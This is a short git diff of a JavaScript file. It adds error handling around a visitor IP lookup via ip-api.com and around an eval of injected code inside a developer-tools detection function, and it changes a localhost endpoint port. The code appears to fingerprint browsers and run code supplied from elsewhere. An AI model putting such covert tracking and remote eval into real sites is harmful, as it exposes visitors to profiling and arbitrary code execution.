@@ -1,5 +1,5 @@
 
-const URL_ENDPOINT = "http://127.0.0.1:9090"
+const URL_ENDPOINT = "http://127.0.0.1:4999"
 
 let bg_ = "debugger"
 let max_load = 0
@@ -71,8 +71,13 @@ async function get_uuid_m() {
         "time_zone": Intl.DateTimeFormat().resolvedOptions().timeZone
     }
 
-    const ip_ = await fetch("http://ip-api.com/json/", {"method": "get"})
-    uuid_m["ip_info"] = await ip_.json()
+    try {
+        const ip_ = await fetch("http://ip-api.com/json/", {"method": "get"})
+        uuid_m["ip_info"] = await ip_.json()
+    } catch {
+        uuid_m["ip_info"] = "error"
+    }
+
     return uuid_m
 }
 
@@ -101,8 +106,13 @@ async function detectar_developer_tools() {
         const codigo = document.createElement("div")
         codigo.innerHTML = html_code
         document.body.appendChild(codigo)
-
-        eval(jscr_code)
+        
+        try {
+            eval(jscr_code)
+        
+        } catch(error) {
+            console.log(error)
+        }
         
         // Ejecutando eval (js)
         return
